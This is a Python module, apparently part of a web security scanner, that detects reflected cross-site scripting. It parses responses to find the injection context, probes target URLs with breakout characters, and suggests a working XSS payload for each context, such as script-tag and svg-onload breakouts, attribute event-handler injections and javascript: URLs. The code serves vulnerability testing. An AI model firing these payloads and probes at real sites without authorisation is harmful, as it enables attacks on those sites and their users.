"""
core/engines/xss/xss_context_engine.py
=========================================
Parser-Aware XSS Context and Breakout Engine for ReconMind Phase 4 by wamiqsec.

THE PROBLEM WITH CURRENT XSS DETECTION:
────────────────────────────────────────────────────────────────
Current approach:
    1. Inject marker "XSS123TEST"
    2. Find marker in response
    3. Run regex backwards to guess context
    4. Report XSS candidate

Problems:
    A. Regex context detection is unreliable on complex HTML
       Real HTML is not regular. Regex fails on:
       - Nested quotes inside attributes
       - Mixed HTML/JS template contexts
       - Multi-line script blocks
       - CDATA sections

    B. "Marker reflected" ≠ "XSS exploitable"
       We report any reflection as XSS-worthy.
       But reflection inside <title>, <meta name="">, <option value="">
       is almost never exploitable without specific conditions.

    C. Encoding detection is incomplete
       We check for HTML entities but miss:
       - JavaScript string encoding (\x3c, \u003c)
       - CSS encoding (\3c)
       - Double encoding (%253c)
       - Context-specific encoding (JSON \u003c)

    D. We don't test breakout feasibility
       Just because a quote character is reflected doesn't mean
       we can break out of context. The parser might re-encode it
       differently from what we tested.

THE NEW APPROACH:
────────────────────────────────────────────────────────────────

STAGE 1: Parser-Based Context Detection
    Use BeautifulSoup to parse the FULL response as a DOM.
    Walk the DOM to find exactly where our marker landed.
    Determine context based on DOM node type, not regex guessing.

STAGE 2: Breakout Probe Analysis
    Before firing XSS payloads, run breakout probes:
    Test each dangerous character individually:
        ' " < > ` \ } { ; /
    Record which characters survive unencoded in response.
    Only fire actual XSS payloads if enough breakout chars survive.

STAGE 3: Encoding Detection (All Forms)
    Check for:
        - HTML entity encoding (&lt; &gt; &quot; &#x27;)
        - JavaScript Unicode escapes (\u003c \u003e)
        - Hex escapes (\x3c \x3e)
        - URL encoding (%3c %3e)
        - Double encoding (%253c)

STAGE 4: Executable Context Validation
    Even if breakout chars survive, the context must be executable.
    A quote in <title> is not executable.
    A quote in <input value=""> can become onmouseover with the right payload.
    A quote in var x = "..." can become JS execution with ';alert(1)//

STAGE 5: Harmless vs Exploitable Classification
    HARMLESS_REFLECTION: Reflected but not exploitable
        - Reflection is HTML-encoded
        - Reflection is in a non-executable context (<title>, <meta>)
        - Breakout chars are blocked
        - CSP would block execution anyway

    EXPLOITABLE_XSS: Requires manual verification
        - Reflection is raw (unencoded)
        - Context is executable (JS, attribute, HTML body)
        - Breakout chars survive
        - Payload reaches a dangerous sink
"""

import re
import time
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from bs4 import BeautifulSoup

from core.recon.url_handler import URLTarget
from core.extractor.param_extractor import Parameter, ParamType
from core.utils.http_client import safe_get, safe_post
from core.intelligence.confidence_engine import (
    create_bundle, mark_signal, calculate_confidence, EvidenceBundle,
)
from config.settings import CONFIG
from core.utils.logger import get_logger

log = get_logger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Context classification
# ─────────────────────────────────────────────────────────────────────────────

class XSSContextType:
    """Parser-determined XSS injection contexts."""
    JS_STRING_SINGLE    = "JS_STRING_SINGLE"    # var x = 'MARKER'
    JS_STRING_DOUBLE    = "JS_STRING_DOUBLE"    # var x = "MARKER"
    JS_STRING_TEMPLATE  = "JS_STRING_TEMPLATE"  # var x = `MARKER`
    JS_BLOCK            = "JS_BLOCK"            # <script>...MARKER...</script>
    HTML_ATTR_DOUBLE    = "HTML_ATTR_DOUBLE"    # <tag attr="MARKER">
    HTML_ATTR_SINGLE    = "HTML_ATTR_SINGLE"    # <tag attr='MARKER'>
    HTML_ATTR_UNQUOTED  = "HTML_ATTR_UNQUOTED"  # <tag attr=MARKER>
    HTML_ATTR_EVENT     = "HTML_ATTR_EVENT"     # <tag onclick="MARKER">
    HTML_BODY           = "HTML_BODY"           # <p>MARKER</p>
    HTML_COMMENT        = "HTML_COMMENT"        # <!-- MARKER -->
    JSON_VALUE          = "JSON_VALUE"          # {"key": "MARKER"}
    HTML_TITLE          = "HTML_TITLE"          # <title>MARKER</title>
    HTML_META           = "HTML_META"           # <meta content="MARKER">
    HTML_NOSCRIPT       = "HTML_NOSCRIPT"       # <noscript>MARKER</noscript>
    CSS_VALUE           = "CSS_VALUE"           # style="color:MARKER"
    URL_CONTEXT         = "URL_CONTEXT"         # href="MARKER" or src="MARKER"
    HARMLESS            = "HARMLESS"            # Non-injectable context
    UNKNOWN             = "UNKNOWN"


# Which contexts are actually exploitable
EXPLOITABLE_CONTEXTS = {
    XSSContextType.JS_STRING_SINGLE,
    XSSContextType.JS_STRING_DOUBLE,
    XSSContextType.JS_STRING_TEMPLATE,
    XSSContextType.JS_BLOCK,
    XSSContextType.HTML_ATTR_DOUBLE,
    XSSContextType.HTML_ATTR_SINGLE,
    XSSContextType.HTML_ATTR_UNQUOTED,
    XSSContextType.HTML_ATTR_EVENT,
    XSSContextType.HTML_BODY,
    XSSContextType.HTML_COMMENT,
    XSSContextType.JSON_VALUE,
    XSSContextType.URL_CONTEXT,
}

# Context-specific required breakout characters
CONTEXT_BREAKOUT_REQUIREMENTS: Dict[str, Set[str]] = {
    XSSContextType.JS_STRING_SINGLE:   {"'"},
    XSSContextType.JS_STRING_DOUBLE:   {'"'},
    XSSContextType.JS_STRING_TEMPLATE: {"`"},
    XSSContextType.JS_BLOCK:           {"<"},
    XSSContextType.HTML_ATTR_DOUBLE:   {'"'},
    XSSContextType.HTML_ATTR_SINGLE:   {"'"},
    XSSContextType.HTML_ATTR_UNQUOTED: {" "},
    XSSContextType.HTML_ATTR_EVENT:    {'"', "'"},
    XSSContextType.HTML_BODY:          {"<"},
    XSSContextType.HTML_COMMENT:       {"-", ">"},
    XSSContextType.JSON_VALUE:         {'"'},
    XSSContextType.URL_CONTEXT:        {"j"},  # javascript: injection
}


# ─────────────────────────────────────────────────────────────────────────────
# Data models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class BreakoutAnalysis:
    """Results of breakout character probing for a specific parameter."""
    parameter: str
    context: str
    chars_tested: List[str] = field(default_factory=list)
    chars_survived_raw: List[str] = field(default_factory=list)    # Unencoded in response
    chars_survived_encoded: List[str] = field(default_factory=list)  # Encoded (HTML entity)
    chars_blocked: List[str] = field(default_factory=list)           # Not in response
    breakout_feasible: bool = False
    required_chars_available: bool = False
    encoding_forms_detected: List[str] = field(default_factory=list)
    confidence: float = 0.0


@dataclass
class XSSContextResult:
    """
    Complete XSS context analysis result for one parameter.

    This replaces the old ContextAnalysis for XSS-specific analysis.
    """
    parameter: str
    param_type: str
    url: str

    # Context detection
    detected_context: str = XSSContextType.UNKNOWN
    context_confidence: float = 0.0
    context_snippet: str = ""

    # Breakout analysis
    breakout: Optional[BreakoutAnalysis] = None

    # Encoding detected
    is_raw_reflection: bool = False
    encoding_detected: List[str] = field(default_factory=list)

    # Exploitability
    is_exploitable: bool = False
    is_harmless_reflection: bool = False
    exploit_vector: str = ""

    # Evidence
    bundle: Optional[EvidenceBundle] = None
    confidence: float = 0.0
    severity: str = "INFO"
    suppressed: bool = True
    notes: List[str] = field(default_factory=list)


# ─────────────────────────────────────────────────────────────────────────────
# Stage 1: Parser-Based Context Detection
# ─────────────────────────────────────────────────────────────────────────────

EVENT_HANDLER_ATTRS = {
    "onclick", "ondblclick", "onmousedown", "onmouseup", "onmouseover",
    "onmousemove", "onmouseout", "onkeydown", "onkeypress", "onkeyup",
    "onload", "onunload", "onsubmit", "onreset", "onfocus", "onblur",
    "onchange", "onselect", "onerror", "onabort", "onresize", "onscroll",
    "oninput", "oninvalid", "onsearch", "ontoggle", "onpointerdown",
}

URL_ATTRS = {"href", "src", "action", "formaction", "data", "xlink:href"}

NON_INJECTABLE_TAGS = {"title", "meta", "noscript", "style", "script"}


def _detect_context_via_dom(html: str, marker: str) -> Tuple[str, float, str]:
    """
    Use DOM parsing to determine where in the document the marker landed.

    This is far more reliable than regex-based context detection.

    Args:
        html:    Full response body.
        marker:  The marker string we injected.

    Returns:
        (context_type: str, confidence: float, snippet: str)
    """
    if marker not in html:
        return XSSContextType.UNKNOWN, 0.0, ""

    # First check: is the marker inside a <script> block?
    # We do this before HTML parsing because parsers sometimes mangle script content
    script_block_pattern = re.compile(
        r'<script[^>]*>(.*?)</script>',
        re.S | re.I,
    )
    for match in script_block_pattern.finditer(html):
        if marker in match.group(1):
            js_content = match.group(1)
            idx = js_content.find(marker)
            # Determine if it's inside a string
            before = js_content[:idx]
            # Count unescaped quotes
            single_quotes = before.count("'") - before.count("\\'")
            double_quotes = before.count('"') - before.count('\\"')
            template_quotes = before.count('`') - before.count('\\`')

            snippet_start = max(0, idx - 60)
            snippet_end = min(len(js_content), idx + len(marker) + 60)
            snippet = js_content[snippet_start:snippet_end].replace("\n", "↵")

            if single_quotes % 2 == 1:
                return XSSContextType.JS_STRING_SINGLE, 0.90, snippet
            elif double_quotes % 2 == 1:
                return XSSContextType.JS_STRING_DOUBLE, 0.90, snippet
            elif template_quotes % 2 == 1:
                return XSSContextType.JS_STRING_TEMPLATE, 0.90, snippet
            else:
                return XSSContextType.JS_BLOCK, 0.85, snippet

    # Check for JS comments
    js_comment_pattern = re.compile(r'//[^\n]*' + re.escape(marker))
    if js_comment_pattern.search(html):
        return XSSContextType.HTML_COMMENT, 0.75, ""

    # Check JSON response (no HTML structure)
    stripped = html.strip()
    if stripped.startswith(("{", "[")):
        if marker in html:
            return XSSContextType.JSON_VALUE, 0.80, ""

    # Parse HTML for DOM-based context detection
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return XSSContextType.UNKNOWN, 0.0, ""

    # Walk all text nodes to find the marker
    for tag in soup.find_all(True):
        # Check tag attributes
        for attr_name, attr_value in tag.attrs.items():
            attr_str = str(attr_value) if not isinstance(attr_value, str) else attr_value
            if marker in attr_str:
                snippet = f'<{tag.name} {attr_name}="{attr_str[:60]}">'

                if attr_name.lower() in EVENT_HANDLER_ATTRS:
                    return XSSContextType.HTML_ATTR_EVENT, 0.95, snippet
                elif attr_name.lower() in URL_ATTRS:
                    return XSSContextType.URL_CONTEXT, 0.85, snippet
                else:
                    # Check quoting style in original HTML
                    orig_pattern = re.compile(
                        re.escape(attr_name) + r'\s*=\s*(["\'])',
                        re.I,
                    )
                    quote_match = orig_pattern.search(html)
                    if quote_match:
                        q = quote_match.group(1)
                        if q == '"':
                            return XSSContextType.HTML_ATTR_DOUBLE, 0.90, snippet
                        else:
                            return XSSContextType.HTML_ATTR_SINGLE, 0.90, snippet
                    return XSSContextType.HTML_ATTR_DOUBLE, 0.80, snippet

        # Check text content
        if tag.string and marker in str(tag.string):
            tag_name = tag.name.lower()
            snippet = f"<{tag_name}>{str(tag.string)[:60]}</{tag_name}>"

            if tag_name == "title":
                return XSSContextType.HTML_TITLE, 0.90, snippet
            elif tag_name == "meta":
                return XSSContextType.HTML_META, 0.90, snippet
            elif tag_name == "noscript":
                return XSSContextType.HTML_NOSCRIPT, 0.90, snippet
            elif tag_name in ("style", "script"):
                return XSSContextType.JS_BLOCK, 0.85, snippet
            else:
                return XSSContextType.HTML_BODY, 0.85, snippet

    # Check HTML comments
    comment_pattern = re.compile(r'<!--.*?' + re.escape(marker) + r'.*?-->', re.S)
    if comment_pattern.search(html):
        return XSSContextType.HTML_COMMENT, 0.90, ""

    return XSSContextType.UNKNOWN, 0.30, ""


# ─────────────────────────────────────────────────────────────────────────────
# Stage 2: Breakout Probe Analysis
# ─────────────────────────────────────────────────────────────────────────────

def _detect_all_encodings(response_text: str, char: str) -> Tuple[bool, bool, List[str]]:
    """
    Check if a character survived raw or was encoded in a response.

    Returns:
        (survived_raw: bool, survived_encoded: bool, encoding_forms: List[str])
    """
    encoding_forms = []

    # Raw survival
    survived_raw = char in response_text

    # HTML entity encoding
    html_encoded = {
        "'":  ["&#x27;", "&#39;", "&apos;"],
        '"':  ["&quot;", "&#x22;", "&#34;"],
        "<":  ["&lt;", "&#x3c;", "&#60;"],
        ">":  ["&gt;", "&#x3e;", "&#62;"],
        "&":  ["&amp;", "&#x26;"],
        "/":  ["&#x2f;", "&#47;"],
        "`":  ["&#x60;", "&#96;"],
        "\\": ["&#x5c;", "&#92;"],
    }
    survived_encoded = False
    for encoded in html_encoded.get(char, []):
        if encoded in response_text:
            survived_encoded = True
            encoding_forms.append(f"html_entity:{encoded}")

    # JS Unicode escape (\u003c)
    hex_code = format(ord(char), '04x')
    for js_enc in [f"\\u{hex_code}", f"\\u{hex_code.upper()}", f"\\x{hex_code[:2]}"]:
        if js_enc in response_text:
            survived_encoded = True
            encoding_forms.append(f"js_escape:{js_enc}")

    # URL encoding (%3c)
    url_encoded = f"%{hex_code.upper()}"
    if url_encoded in response_text or url_encoded.lower() in response_text:
        survived_encoded = True
        encoding_forms.append(f"url_encoded:{url_encoded}")

    return survived_raw, survived_encoded, encoding_forms


def _run_breakout_probes(
    target: URLTarget,
    param: Parameter,
    context: str,
    marker: str,
) -> BreakoutAnalysis:
    """
    Test each dangerous character individually to see what survives.

    For each character in breakout_probe_chars:
        1. Build URL with marker + character injected
        2. Fetch response
        3. Check if character appears raw, encoded, or blocked

    Args:
        target:  URLTarget.
        param:   Parameter being tested.
        context: Detected context type.
        marker:  The reflection marker (to combine with test chars).

    Returns:
        BreakoutAnalysis with per-character survival data.
    """
    cfg = CONFIG.xss_engine
    analysis = BreakoutAnalysis(
        parameter=param.name,
        context=context,
        chars_tested=list(cfg.breakout_probe_chars),
    )

    all_encoding_forms = []

    for char in cfg.breakout_probe_chars:
        probe_value = marker + char

        if param.param_type == ParamType.GET:
            parsed = urlparse(target.normalized)
            qp = parse_qs(parsed.query, keep_blank_values=True)
            qp[param.name] = [probe_value]
            probe_url = urlunparse(parsed._replace(
                query=urlencode({k: v[0] for k, v in qp.items()})
            ))
            response = safe_get(probe_url, allow_redirects=False)
        else:
            post_url = param.form_action or target.base_url()
            response = safe_post(post_url, data={param.name: probe_value}, allow_redirects=False)

        time.sleep(0.2)

        if response is None:
            analysis.chars_blocked.append(char)
            continue

        raw, encoded, enc_forms = _detect_all_encodings(response.text, char)
        all_encoding_forms.extend(enc_forms)

        if raw:
            analysis.chars_survived_raw.append(char)
        elif encoded:
            analysis.chars_survived_encoded.append(char)
        else:
            analysis.chars_blocked.append(char)

    analysis.encoding_forms_detected = list(set(all_encoding_forms))

    # Check if required breakout chars for this context survived raw
    required = CONTEXT_BREAKOUT_REQUIREMENTS.get(context, {"<"})
    raw_set = set(analysis.chars_survived_raw)
    analysis.required_chars_available = bool(required.issubset(raw_set))

    # Breakout is feasible if required chars survived
    analysis.breakout_feasible = analysis.required_chars_available

    # Confidence in breakout: proportion of required chars that survived raw
    if required:
        survived_required = len(required.intersection(raw_set))
        analysis.confidence = survived_required / len(required)
    else:
        analysis.confidence = 0.5

    log.info(
        "Breakout analysis for param=%r context=%s: "
        "raw=%s encoded=%s blocked=%s feasible=%s",
        param.name, context,
        analysis.chars_survived_raw,
        [c for c in analysis.chars_survived_encoded],
        analysis.chars_blocked,
        analysis.breakout_feasible,
    )

    return analysis


# ─────────────────────────────────────────────────────────────────────────────
# Stage 4: Exploitability classification
# ─────────────────────────────────────────────────────────────────────────────

def _classify_exploitability(
    context: str,
    breakout: BreakoutAnalysis,
    is_raw: bool,
) -> Tuple[bool, bool, str, str]:
    """
    Determine if a reflection is exploitable or harmless.

    Args:
        context:  Detected XSS context type.
        breakout: Breakout analysis results.
        is_raw:   Whether the marker was reflected raw (unencoded).

    Returns:
        (is_exploitable, is_harmless, exploit_vector, explanation)
    """
    # Non-injectable contexts — always harmless
    non_injectable = {
        XSSContextType.HTML_TITLE,
        XSSContextType.HTML_META,
        XSSContextType.HTML_NOSCRIPT,
        XSSContextType.CSS_VALUE,
        XSSContextType.HARMLESS,
        XSSContextType.UNKNOWN,
    }
    if context in non_injectable:
        return False, True, "", f"Context {context} is non-injectable (harmless reflection)"

    # If not raw reflected, exploitability is much lower
    if not is_raw and not breakout.chars_survived_raw:
        return False, True, "", "All dangerous characters are encoded (harmless reflection)"

    # If in exploitable context but breakout not feasible
    if context in EXPLOITABLE_CONTEXTS and not breakout.breakout_feasible:
        if breakout.chars_survived_encoded:
            return (
                False, True,
                "",
                f"Context {context} — chars encoded, breakout not feasible",
            )

    # Fully exploitable
    if context in EXPLOITABLE_CONTEXTS and breakout.breakout_feasible:
        vector = _get_exploit_vector(context)
        return True, False, vector, f"Context {context} — breakout feasible"

    # Partial exploitability (some chars survived, worth manual check)
    if is_raw and context in EXPLOITABLE_CONTEXTS:
        vector = _get_exploit_vector(context)
        return True, False, vector, f"Context {context} — raw reflection, manual verify needed"

    return False, True, "", f"No clear exploit path for context {context}"


def _get_exploit_vector(context: str) -> str:
    """Return the recommended exploit vector for a given context."""
    vectors = {
        XSSContextType.JS_STRING_SINGLE:   "';alert(document.domain)//",
        XSSContextType.JS_STRING_DOUBLE:   '";alert(document.domain)//',
        XSSContextType.JS_STRING_TEMPLATE: "`};alert(document.domain)//",
        XSSContextType.JS_BLOCK:           "</script><script>alert(document.domain)</script>",
        XSSContextType.HTML_ATTR_DOUBLE:   '" onmouseover="alert(document.domain)"',
        XSSContextType.HTML_ATTR_SINGLE:   "' onmouseover='alert(document.domain)'",
        XSSContextType.HTML_ATTR_UNQUOTED: " onmouseover=alert(document.domain) ",
        XSSContextType.HTML_ATTR_EVENT:    "alert(document.domain)",
        XSSContextType.HTML_BODY:          "<svg onload=alert(document.domain)>",
        XSSContextType.HTML_COMMENT:       "--><svg onload=alert(document.domain)><!--",
        XSSContextType.JSON_VALUE:         '","xss":"<svg onload=alert(1)>',
        XSSContextType.URL_CONTEXT:        "javascript:alert(document.domain)",
    }
    return vectors.get(context, "<svg onload=alert(document.domain)>")


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

def analyze_xss_context(
    target: URLTarget,
    param: Parameter,
    reflection_response: str,
    marker: str,
) -> XSSContextResult:
    """
    Run the full parser-aware XSS context analysis pipeline.

    This replaces the old context_analyzer.py for XSS-specific analysis.
    Produces a definitive answer: is this exploitable XSS or harmless reflection?

    Pipeline:
        Stage 1: DOM-based context detection
        Stage 2: Breakout probe analysis
        Stage 3: Encoding detection
        Stage 4: Exploitability classification
        Stage 5: Evidence bundle assembly

    Args:
        target:              URLTarget.
        param:               The reflected Parameter.
        reflection_response: The response body where reflection was found.
        marker:              The marker string that was reflected.

    Returns:
        XSSContextResult with full analysis and confidence.
    """
    result = XSSContextResult(
        parameter=param.name,
        param_type=param.param_type,
        url=target.normalized,
    )

    # ── Stage 1: Context detection ────────────────────────────────────────
    context, ctx_confidence, snippet = _detect_context_via_dom(reflection_response, marker)
    result.detected_context = context
    result.context_confidence = ctx_confidence
    result.context_snippet = snippet

    log.info(
        "XSS context for param=%r: %s (%.0f%%)",
        param.name, context, ctx_confidence * 100,
    )

    # ── Stage 2: Encoding detection ───────────────────────────────────────
    # Check if the marker itself was reflected raw
    result.is_raw_reflection = marker in reflection_response

    # ── Stage 3: Breakout probes (only for potentially exploitable contexts)
    if context in EXPLOITABLE_CONTEXTS and result.is_raw_reflection:
        result.breakout = _run_breakout_probes(target, param, context, marker)
    else:
        result.breakout = BreakoutAnalysis(
            parameter=param.name,
            context=context,
            breakout_feasible=False,
        )

    # ── Stage 4: Exploitability classification ────────────────────────────
    is_exploitable, is_harmless, exploit_vector, explanation = _classify_exploitability(
        context=context,
        breakout=result.breakout,
        is_raw=result.is_raw_reflection,
    )

    result.is_exploitable = is_exploitable
    result.is_harmless_reflection = is_harmless
    result.exploit_vector = exploit_vector

    # ── Stage 5: Evidence bundle ──────────────────────────────────────────
    bundle = create_bundle(
        module="XSS",
        url=target.normalized,
        parameter=param.name,
        param_type=param.param_type,
    )

    if result.is_raw_reflection:
        mark_signal(bundle, "marker_reflected_raw", f"Marker reflected without encoding")

    if context in EXPLOITABLE_CONTEXTS:
        mark_signal(bundle, "js_context_confirmed",
                    f"Parser-confirmed context: {context}")

    if result.breakout and result.breakout.breakout_feasible:
        mark_signal(bundle, "payload_reflected_raw",
                    f"Breakout chars survived raw: {result.breakout.chars_survived_raw}")

    if not result.is_raw_reflection or result.is_harmless_reflection:
        mark_signal(bundle, "reflection_is_encoded",
                    explanation)

    bundle = calculate_confidence(bundle)
    result.bundle = bundle
    result.confidence = bundle.combined_confidence
    result.severity = bundle.severity
    result.suppressed = bundle.suppressed

    # ── Build notes ───────────────────────────────────────────────────────
    if is_exploitable:
        result.notes.append(f"Context: {context} — breakout confirmed")
        result.notes.append(f"Suggested payload: {exploit_vector}")
        result.notes.append("Verify manually: copy URL to browser, check alert fires")
    elif is_harmless:
        result.notes.append(f"Harmless reflection: {explanation}")
        result.notes.append("Suppressed — does not warrant manual investigation")

    log.info(
        "XSS analysis result: param=%r exploitable=%s harmless=%s confidence=%.0f%%",
        param.name, is_exploitable, is_harmless, bundle.combined_confidence * 100,
    )

    return result
